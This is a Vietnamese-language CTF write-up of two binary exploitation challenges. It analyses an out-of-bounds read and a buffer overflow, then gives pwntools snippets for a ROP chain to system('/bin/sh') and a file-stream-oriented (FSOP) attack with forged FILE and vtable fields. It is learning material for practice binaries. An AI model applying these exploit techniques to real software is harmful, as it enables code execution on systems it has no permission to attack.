# KMA CTF II 2026
## Binary exploit by kazuke
Challenge này có 2 lỗi chính: OOB read và Buffer Overflow

### OOB read
Lỗi thứ nhất cho phép em leak libc, nó xuất hiện ở hàm `read_mail`:
```c
__int64 read_mail()
{
  int int_num; // [rsp+4h] [rbp-Ch]
  mail *mail; // [rsp+8h] [rbp-8h]

  mail_print((__int64)"Mail id: ");
  int_num = mail_read_int();
  if ( int_num <= 0 )
    return mail_print((__int64)"Invalid mail id\n");
  mail = (mail *)new_mail(int_num);
  if ( !mail )
    return mail_print((__int64)"Invalid mail id\n");
  mail_print((__int64)"From: ");
  mail_print((__int64)mail->sender);
  mail_print((__int64)"\nTo: ");
  mail_print((__int64)mail->recipe);
  mail_print((__int64)"\nSubject: ");
  mail_print((__int64)mail->subj);
  mail_print((__int64)"\nBody:\n");
  mail_write(1, mail->body, 0x110);
  return mail_print((__int64)"\n");
}
```
Hàm `mail_write` trong trường hợp này hoạt động giống `write(1, buf, 0x110)`. Nó in hết `0x110` byte ra màn hình mà không phân biệt byte NULL

![alt text](./assets/image.png)

Vì địa chỉ `stdout` được rải rác khắp nơi trên bss và nó nằm trong vùng `0x110` byte nên là em có thể leak đc libc từ đây

![alt text](./assets/image-1.png)

### Buffer Overflow
Buffer Overflow xuất hiện ở hàm `import_archive`:
```c
// vuln func
unsigned __int64 import_archive()
{
...
  _BYTE buf[5]; // [rsp+1Bh] [rbp-15h] BYREF
  unsigned __int16 v8; // [rsp+20h] [rbp-10h] BYREF
  unsigned __int16 v9; // [rsp+22h] [rbp-Eh] BYREF
  unsigned __int16 v10; // [rsp+24h] [rbp-Ch] BYREF
  unsigned __int16 v11; // [rsp+26h] [rbp-Ah] BYREF
...
    mail_print((__int64)"Paste archive blob:\n");
  if ( mail_read(0, (__int64)buf, 13) == 13
  // Chỉ cần pass các điều kiện trong if này
  // Có thể điều khiển từng len dựa vào input của mik
    && buf[0] == 0x4D
    && buf[1] == 0x41
    && buf[2] == 0x49
    && buf[3] == 0x4C
    && buf[4] == 1
    && (sender_len = get_val(&v8),
        recv_len = get_val(&v9),
        subj_len = get_val(&v10),
        body_len = get_val(&v11),
        sender_len <= 0x30u)
    && recv_len <= 0x30u
    && subj_len <= 0x60u )
  {
    archive = (archive *)get_slot();
    if ( archive )
    {
      if ( sender_len && mail_read(0, (__int64)archive->sender_len, sender_len) != sender_len )
        goto LABEL_29;
      if ( sender_len <= 0x2Fu )
        archive->sender_len[sender_len] = 0;
      if ( recv_len && mail_read(0, (__int64)&archive->mail.sender[35], recv_len) != recv_len )
        goto LABEL_29;
      if ( recv_len <= 0x2Fu )
        archive->mail.sender[recv_len + 0x23] = 0;
      if ( subj_len && mail_read(0, (__int64)&archive->mail.recipe[35], subj_len) != subj_len )
        goto LABEL_29;
      if ( subj_len <= 0x5Fu )
        archive->mail.recipe[subj_len + 0x23] = 0;
      data = mail_read_data(0, &archive->mail.subj[83], body_len);
      if ( data >= 0 )
      {
        if ( body_len <= 0xFFu && (unsigned __int64)data < 0x100 )
          archive->mail.subj[data + 0x53] = 0;
        mail_print((__int64)"Imported as id ");
        archive_len(*(_DWORD *)archive->name);
        mail_print((__int64)"\n");
...
}
```
Đọc sơ thì `if condition` có check len của các phần tử từ input của user nhưng thiếu `body_len`, nghĩa là len của body có dài tới mấy vẫn bypass đc. Trong khi len thực tế của nó chỉ tới `0x100`
```c
typedef struct mail{
    char id[5];
    char sender[0x30];
    char recipe[0x30];
    char subj[0x60];
    char body[100];
} mail;
```
Vì ko có bất cứ thứ gì check độ dài hợp lệ của body nên sinh ra `Buffer Overflow`. Lúc này, khi program cho em nhập input thì em sẽ ghi đè đc `saved rip`
```c
data = mail_read_data(0, &archive->mail.subj[83], body_len);
```
Điểm đặc biệt ở hàm này là nó gọi `mail_read`(hoạt động giống read) trong internal của chính nó:
![alt text](./assets/image-2.png)

Lúc này, em chỉ việc chỉnh offset sao cho hợp lý để rop chain và call system là có đc shell

```py
slna(b'> ', 6)
sa(b'Paste archive blob:\n', load)
s(b'a'*0x30)
s(b'b'*0x30)
s(b'c'*0x60)
pop_rdi = 0x00000000000277e5 + libc.address
load = flat(
    b'a'*0x98,
    pop_rdi+1,
    pop_rdi,
    next(libc.search(b'/bin/sh\0')),
    libc.sym.system
).ljust(0x200, b'a')

s(load)
```
![alt text](./assets/image-3.png)

## quiet
Challenge này cũng có 2 bug chính: Nối chuỗi %s và Buffer Overflow
### Nối chuỗi %s
Challenge cho phép em edit `operator` (leak bin) và `auditor` (leak libc), mỗi cái em đều được edit tối đa `0x40` bytes:
```c
unsigned __int64 __fastcall edit(void *target)
{
  unsigned __int64 v2; // [rsp+18h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  puts("label:");
  if ( (int)get_input(target, 0x40u) < 0 )
    perror("short label");
  puts("saved");
  return v2 - __readfsqword(0x28u);
}
```
Bug nằm ở 2 hàm này trong hàm `show cards`:
```c
show_oprator(&operator_4060);
show_auditor(&auditor_40A0);
```
Cả 2 hàm đều in content bằng `%s`, điều này khiến em có thể nối chuỗi nhờ nhập `0x40` input ở cả 2 loại

Lúc này, em có thể leak được `bin` lẫn `libc` nhờ vào việc nối chuỗi cả 2
- Show_operator:
![alt text](./assets/image-4.png)
- show_auditor:
![alt text](./assets/image-5.png)

Khúc leak đc 2 thằng này thì em chủ yếu spam input để test nên ko có reverse 2 hàm `show`

### Buffer Overflow
Bug thứ 2 nằm ở `import_packet`:
```c
unsigned __int64 import_packet()
{
  char src_name[24]; // [rsp+10h] [rbp-20h] BYREF
  unsigned __int64 v2; // [rsp+28h] [rbp-8h]

  v2 = __readfsqword(0x28u);
  printf("source name: ");
  if ( (int)get_str((__int64)src_name, 0x10u) < 0 )
    perror("input closed");
  stream_fd_3B0 = get_fd(src_name);
  if ( stream_fd_3B0 )
  {
    if ( fread(&packet_size_43A0, 1u, 2u, stream_fd_3B0) == 2 )
    {
      printf("packet bytes: %u\n", (unsigned __int16)packet_size_43A0);// not clear bytes before read other sources
      if ( fread(&packet_data_43B0, 1u, (unsigned __int16)packet_size_43A0, stream_fd_3B0) != (unsigned __int16)packet_size_43A0 )
        puts("packet truncated");
      fclose(stream_fd_3B0);
...
```
Ở hàm `get_fd`, có 1 điều kiện đặc biệt là nếu `path` là `@` thì sẽ xài `dup` và `fdopen`
```c
FILE *__fastcall get_fd(const char *name)
{
  int src_idx; // [rsp+10h] [rbp-10h]
  int fd; // [rsp+14h] [rbp-Ch]

  src_idx = find_src(name);
  if ( *((_BYTE *)&path_40F8 + 0x58 * src_idx) != '@' )
    return fopen(sources_40E0[src_idx].path, "rb");
  fd = dup(dword_40E4[0x16 * src_idx]);         // bug?
  if ( fd >= 0 )
    return fdopen(fd, "rb");
  else
    return 0;
}
```
Điều đáng chú ý ở đây là `dup`, vì nó là 1 hàm lạ nên em có note lại luôn. Tác dụng của nó là duplicate 1 cái fd có sẵn sang cái fd mới, `cả 2 cùng trỏ vào 1 file description`
> The [dup()](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://man7.org/linux/man-pages/man2/dup.2.html&ved=2ahUKEwi3y_C-qemWAxVRZvUHHShYBfgQFnoECA8QAQ&usg=AOvVaw1ES3yyJi2RCS37dSNpb2BE) system call allocates a new file descriptor that refers to the same open file description as the descriptor oldfd. ()

Vì tại vị trí lấy `fd = NULL` nên lúc này `dup` tạo thêm 1 fd mới trỏ vào `0` là nơi nhận input của user
![alt text](./assets/image-6.png)
> fd mới đc mở vẫn sẽ là `3`

Lúc này, các hàm `fread` sau hoạt động như 1 read bình thường cho phép user nhập input, cách hoạt động mà chương trình ko mong muốn:
```c
 stream_fd_3B0 = get_fd(src_name);
  if ( stream_fd_3B0 )
  {
    if ( fread(&packet_size_43A0, 1u, 2u, stream_fd_3B0) == 2 )
    {
      printf("packet bytes: %u\n", (unsigned __int16)packet_size_43A0);// not clear bytes before read other sources
      if ( fread(&packet_data_43B0, 1u, (unsigned __int16)packet_size_43A0, stream_fd_3B0) != (unsigned __int16)packet_size_43A0 )
        puts("packet truncated");
      fclose(stream_fd_3B0);
      stream_fd_3B0 = 0;
      puts("import complete");
    }
```
Vì program lấy `packet_size_43A0` như 1 size để nhập cho `packet data` thông thường nên em có thể tạo ra `Buffer Overflow` thông qua `packet_size_43A0` đã bị control.

Mà nơi chứa con trỏ heap `file struct` của cái `fd` đó lại nằm ngay dưới vùng `packet_data_43B0` nên em có thể ghi đè và fake thành 1 cái file struct khác. Sau đó tận dụng `fclose` cái `struct fake` đó mà thực thi fsop.

![alt text](./assets/image-11.png)
### FSOP
Vì kĩ thuật này em đã note ở trong 1 số write up khác nên em chỉ cần lấy lại script r chỉnh sửa 1 chút là được

- [file_struct_layout](https://github.com/dungthtd9126/CTF-note)
- [fsop_technique](https://github.com/dungthtd9126/Lac-CTF)
- [fsop_base_knowledge](https://github.com/dungthtd9126/write-up-task-CLB/tree/main/task2)

> Từ khúc này trở đi thì em sẽ viết thêm cách debug hay điểm cần lưu ý để bản thân tương lai đọc lại

Để call được `vtable` thì mục tiêu là thỏa mãn điều kiện như hình để call `_IO_OVERFLOW` (chính là vtable)
![alt text](./assets/image-7.png)

Sau khi call `fake vtable` là `IO_wfile_overflow` thì sẽ cần chú ý component `_wide_data`(offset: 0xa0) ở trong `FILE struct`

![alt text](./assets/image-8.png)

Đặc biệt chú ý từ dòng asm `_IO_wfile_overflow+32`, `rdi` hiện tại là con trỏ đầu `FILE struct`. Nên `[rdi+0xa0]` sẽ trả về `fake wide data`. Lúc này, phải điều khiển sao cho `wide_data->read_base = 0` thì mới call được `_IO_wdoallocbuf`. 

Sau đó, trong `_IO_wdoallocbuf` phải control sao cho `wide_data->write_end = 0` thì mới jump tiếp tới chỗ mong muốn 
![alt text](./assets/image-9.png)

Khi call `hàm fake` cuối cùng thì điều chỉnh offset của `hàm fake` sao cho phù hợp

![alt text](./assets/image-10.png)

### Các điều kiện để FSOP
- flags = `0x3b01010101010101`
- _IO_read_ptr = `b'sh'`
- fp->mode <= 0
- fd->write_ptr > fp_write_base
- `wide_data->read_base` (_IO_wfile_overflow) = `wide_data->write_end` (_IO_wdoallocbuf) = 0

Example:
```py
io = FileStructure()
io.flags = 0x3b01010101010101
io._IO_read_ptr = b'sh'
io._IO_write_ptr = exe.address+0x5000
io._IO_write_base = 0
io.chain = libc.sym._IO_2_1_stdout_
io.vtable = libc.sym._IO_wfile_jumps+8
io._lock = libc.sym._IO_stdfile_2_lock
io._wide_data = exe.address +0x4490 # check later
```